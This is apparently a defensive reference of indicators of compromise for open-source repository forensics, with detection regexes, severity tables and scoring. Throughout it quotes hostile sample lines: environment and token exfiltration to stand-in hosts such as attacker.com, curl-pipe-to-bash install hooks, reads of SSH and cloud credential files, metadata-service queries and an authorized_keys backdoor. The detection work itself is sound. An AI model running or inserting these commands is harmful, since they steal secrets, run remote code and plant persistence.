# IOC Patterns Reference

Indicators of Compromise (IOCs) for open-source repository forensics.
Load this reference during Phase 2 (IOC Extraction) to guide pattern matching.

---

## Category 1: Code Obfuscation

These patterns hide malicious intent within committed code.

### 1.1 Base64 Encoding

**Purpose:** Hide payload content from static analysis and human review.

| Language | Pattern | Risk |
|----------|---------|------|
| JavaScript | `eval(Buffer.from("...", "base64").toString())` | CRITICAL |
| JavaScript | `eval(atob("..."))` | CRITICAL |
| Python | `exec(base64.b64decode("..."))` | CRITICAL |
| PHP | `eval(base64_decode("..."))` | CRITICAL |
| Bash | `eval "$(echo "..." \| base64 -d)"` | CRITICAL |

**Detection regex:**
```regex
eval\s*\(\s*(?:Buffer\.from|atob|base64\.b64decode|base64_decode)\s*\(
```

**False positive mitigations:**
- Test files (`*.test.js`, `*_test.py`, `spec/`)
- Known third-party minified bundles in `vendor/` or `dist/`
- Documentation examples (Markdown files)

### 1.2 Hex Encoding

```javascript
// Malicious: constructing a URL via hex encoding
var h = '\x68\x74\x74\x70\x73\x3a\x2f\x2f';  // https://
```

**Detection:** Any string literal containing 5+ consecutive `\xNN` hex escapes in production code.

### 1.3 Long Opaque String Literals

Base64 payloads embedded as string constants:
```javascript
const _0x1a2b = "SGVsbG8gV29ybGQ...VERY_LONG_STRING...==";
```

**Detection:** String literals > 200 characters consisting of Base64 alphabet characters (`[A-Za-z0-9+/=]`).

### 1.4 Dynamic Code Evaluation

```javascript
eval(code)                    // Direct eval
new Function("return " + x)() // Function constructor
setTimeout("malicious()", 0)  // String-arg setTimeout
```

```python
exec(compile(code, "", "exec"))  # compile+exec
__import__("os").system(cmd)     # dynamic import
getattr(__builtins__, "eval")(x) # getattr obfuscation
```

### 1.5 Variable Name Obfuscation

Malicious code often uses mangled names:
```javascript
var _0x4f2a = function(_0x1b3c, _0x9d8e) { ... }
```

Combined with encoding, this is a strong signal.

---

## Category 2: Exfiltration

These patterns send data outside the project's documented network scope.

### 2.1 HTTP/HTTPS Callbacks

**High confidence** when found in install hooks, CI scripts, or production entry points.

```javascript
// Suspicious: unfamiliar domain not in project docs
fetch("https://collect-stats.io/data", {
  method: "POST",
  body: JSON.stringify(process.env)
});

// Suspicious: environment data in URL
require("https").get(`https://logs.io/?d=${Buffer.from(JSON.stringify(process.env)).toString("base64")}`);
```

**Detection patterns:**
```regex
(?:fetch|axios\.post|axios\.get|http\.request|https\.request)\s*\(\s*['"`]https?://
```

**Allowlist common legitimate domains** (customize per project):
- `api.github.com` — GitHub API
- `registry.npmjs.org`, `pypi.org` — package registries
- `api.codecov.io` — coverage
- `sonarcloud.io` — code quality

Flag any domain **not** in the project's existing codebase history.

### 2.2 DNS Exfiltration

Encodes secrets in DNS lookups, bypassing HTTP-level monitoring:
```javascript
require("dns").resolve(`${Buffer.from(process.env.TOKEN).toString("hex")}.attacker.com`);
```

```python
import socket
socket.gethostbyname(os.environ["SECRET"].encode("hex") + ".exfil.io")
```

**Detection:**
```regex
dns\.resolve\s*\(`[^`]*\$\{[^}]*(?:env|getenv|environ)
```

### 2.3 Webhook Abuse

Sending secrets to third-party webhook endpoints:
```javascript
fetch("https://discord.com/api/webhooks/1234567/TOKEN", {
  method: "POST",
  body: JSON.stringify({ content: JSON.stringify(process.env) })
});
```

**Flag:** Any POST to `discord.com/api/webhooks/`, `hooks.slack.com/`, or Telegram Bot API in non-notification-tool code.

### 2.4 Environment Variable Exfiltration

**Critical pattern** — directly sending the full environment:
```javascript
process.env              // JavaScript (entire env object)
Object.entries(process.env).join(",")  // Serialized
```

```python
os.environ.copy()        # Python (entire env dict)
dict(os.environ)
```

```bash
env | curl -d @- https://attacker.com/collect  # Bash
printenv | nc attacker.com 1337
```

---

## Category 3: Environment Variable Access (CI Secrets)

Accessing specific high-value CI/CD secret variables.

### 3.1 Token and Credential Vars

**CRITICAL severity** when found in postinstall scripts or non-test production code:

```
NPM_TOKEN, NPM_AUTH_TOKEN
GITHUB_TOKEN, GH_TOKEN, GITHUB_PAT
AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_SESSION_TOKEN
DOCKER_PASSWORD, DOCKER_HUB_TOKEN
SNYK_TOKEN, CODECOV_TOKEN, SONAR_TOKEN
PYPI_TOKEN, PYPI_PASSWORD
VERCEL_TOKEN, NETLIFY_TOKEN
GCP_SA_KEY, GOOGLE_APPLICATION_CREDENTIALS
SLACK_TOKEN, SLACK_WEBHOOK
```

**Detection (JavaScript):**
```regex
process\.env\.(?:NPM|GH|GITHUB|AWS|DOCKER|PYPI|VERCEL|GCP|SNYK|CODECOV|SONAR)[_A-Z]*
```

**Detection (Python):**
```regex
os\.environ(?:\.get)?\s*\(\s*['"](?:NPM|GH|GITHUB|AWS|DOCKER|PYPI|GCP)[_A-Z]*['"]
```

### 3.2 SSH and Credentials File Access

```bash
cat ~/.ssh/id_rsa
cat ~/.ssh/id_ed25519
cat ~/.aws/credentials
cat ~/.npmrc
cat ~/.netrc
cat ~/.gitconfig
```

**Regex:**
```regex
(?:~|\/root|\/home\/\w+)\/\.(?:ssh\/id_|aws\/credentials|npmrc|netrc|gitconfig)
```

### 3.3 Docker and Container Secrets

```bash
cat /run/secrets/*
env | grep -i secret
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/  # AWS IMDS
curl -s http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/  # GCP
```

---

## Category 4: Install Hook Abuse

Malicious code executed automatically during package installation.

### 4.1 npm postinstall / preinstall

**High-confidence IOC** — any network call in install scripts:

```json
// package.json
{
  "scripts": {
    "postinstall": "node -e \"require('http').get('https://c2.io/'+process.env.PATH)\"",
    "preinstall": "curl https://attacker.com/setup.sh | bash"
  }
}
```

**Legitimate uses** (lower suspicion): compiling native addons (`node-gyp rebuild`), generating type stubs (`tsc`).

**Red flags in install scripts:**
- `curl`, `wget`, `fetch`, `require("http")`
- `eval`, `exec`
- References to `process.env.*` token variables
- Encoded payloads

### 4.2 Python setup.py

```python
# setup.py — malicious custom install command
from setuptools import setup
from setuptools.command.install import install
import subprocess

class PostInstall(install):
    def run(self):
        install.run(self)
        subprocess.Popen(["python", "-c", "import urllib; ..."])

setup(
    cmdclass={"install": PostInstall},
    ...
)
```

**Detection:** Any `cmdclass` in `setup.py` that inherits from `install`, `develop`, or `egg_info` and executes subprocesses.

### 4.3 Go Build Directives

```go
//go:generate curl https://attacker.com/setup.sh | sh
```

### 4.4 CMake ExternalProject

```cmake
ExternalProject_Add(suspicious_lib
  URL https://suspicious-host.com/lib.tar.gz
  CONFIGURE_COMMAND ...
)
```

---

## Category 5: File System IOCs

Suspicious file system operations indicating post-exploitation or persistence.

### 5.1 Temp Directory Writes

```javascript
const fs = require("fs");
fs.writeFileSync("/tmp/.x", payload);  // Writing to temp
require("/tmp/.x");                     // Then executing
```

### 5.2 Sensitive Path Access

```bash
# Linux/macOS
/etc/passwd, /etc/shadow
/proc/self/environ          # Current process environment
/proc/{pid}/maps            # Memory maps
~/.bash_history
~/.zsh_history
```

### 5.3 SSH Key Modification

Adding to `authorized_keys` for persistence:
```bash
echo "ssh-rsa AAAA...attacker_key" >> ~/.ssh/authorized_keys
```

---

## Category 6: CI/CD Workflow IOCs

GitHub Actions-specific indicators.

### 6.1 Dangerous Triggers

```yaml
# pull_request_target + checkout of PR code = TOCTOU vulnerability
on:
  pull_request_target:

jobs:
  build:
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # DANGEROUS: runs untrusted code
```

### 6.2 Remote Script Execution

```yaml
- name: Setup
  run: curl https://remote-host.com/setup.sh | bash
```

### 6.3 Secret Exfiltration in Workflows

```yaml
- name: Build
  run: |
    echo "token=${{ secrets.GITHUB_TOKEN }}" | curl -d @- https://attacker.com
```

### 6.4 Unpinned Actions (Supply Chain Risk)

```yaml
# Pinned by tag (bad — tags can be moved):
uses: actions/checkout@v4

# Pinned by branch (bad — branches can change):
uses: third-party/action@main

# Correct (immutable SHA):
uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
```

### 6.5 GITHUB_TOKEN Scope Abuse

Workflows that request `write-all` permissions without justification:
```yaml
permissions:
  contents: write
  packages: write
  id-token: write  # OIDC token — high value for cloud auth
```

---

## Category 7: Behavioral IOCs

Patterns in repository activity, not code content.

### 7.1 Maintainer Timeline Anomalies

| Signal | Threshold | Confidence |
|--------|-----------|------------|
| New collaborator added before malicious commit | < 7 days | HIGH |
| New SSH deploy key added before malicious commit | < 7 days | HIGH |
| Commit author timezone offset change | > 4 hours from historical mean | MEDIUM |
| Commit at unusual hour for author | Outside 06:00–23:00 local time | LOW |
| First commit from new device/committer email | N/A | MEDIUM |
| Commit GPG signature absent (previously signed) | N/A | HIGH |

### 7.2 Branch and Permission Changes

| Signal | Evidence Source | Confidence |
|--------|----------------|------------|
| Branch protection disabled | GitHub API, GH Archive | HIGH |
| Force push to default branch | `git reflog`, GH Archive `PushEvent.forced=true` | HIGH |
| New webhook added | GitHub API `/hooks` | HIGH |
| Deploy key added with write access | GitHub API `/keys` | HIGH |
| Repository made public | GH Archive `PublicEvent` | MEDIUM |

### 7.3 Release Anomalies

| Signal | Detection | Confidence |
|--------|-----------|------------|
| Release published without associated merged PR | No PR merged within 48h before release | HIGH |
| Release asset hash changed after publish | Compare `dist.integrity` across time | CRITICAL |
| Version re-published (same version, different content) | npm `time` field shows duplicate publish | HIGH |
| Prerelease tag moved to stable | `dist-tags.latest` changed unexpectedly | MEDIUM |

### 7.4 Commit Message Anomalies

| Signal | Example | Confidence |
|--------|---------|------------|
| Generic/empty commit messages after takeover | "update", "fix", "misc" | LOW |
| Commit messages in different language | Sudden switch from English to Russian | MEDIUM |
| Merge commit without associated PR number | "Merge branch 'dev'" with no PR ref | MEDIUM |

---

## IOC Severity Matrix

| Severity | Definition | Examples |
|----------|------------|---------|
| **CRITICAL** | Direct evidence of malicious action | `eval(atob(...))` in postinstall, process.env sent to unknown URL |
| **HIGH** | Strong indicator, likely malicious | Force push without PR, new maintainer before suspicious commit |
| **MEDIUM** | Suspicious but may be legitimate | env var access in non-test code, unpinned Actions |
| **LOW** | Weak signal, needs corroboration | Unusual commit timezone, generic commit message |

---

## IOC Scoring

To prioritize investigation focus:

```
Total IOC Score = Σ (severity_weight × count)

Severity weights:
  CRITICAL = 10
  HIGH     = 5
  MEDIUM   = 2
  LOW      = 1

Score interpretation:
  > 20:  Confirmed compromise highly likely — immediate escalation
  10–20: Strong indicators — deep investigation required
  5–10:  Suspicious — systematic investigation recommended
  < 5:   Monitor — may be false positives
```

---

## Common False Positives

Always verify before asserting compromise:

| Pattern | Legitimate Cause |
|---------|-----------------|
| `base64` decode | Encoding/decoding utilities, test fixtures |
| `eval()` | Template engines (Handlebars, EJS), REPL implementations |
| `process.env.*` access | Normal app configuration reading |
| `curl \| bash` in docs | Developer quickstart instructions (README only) |
| Network calls in tests | Integration test suites (check if gated by CI env var) |
| Outbound HTTP | Telemetry, update checks (check if documented and opt-out available) |
| New contributor email | Author using work vs personal email |
| Timezone shift | Developer travel, VPN use, remote contractor |
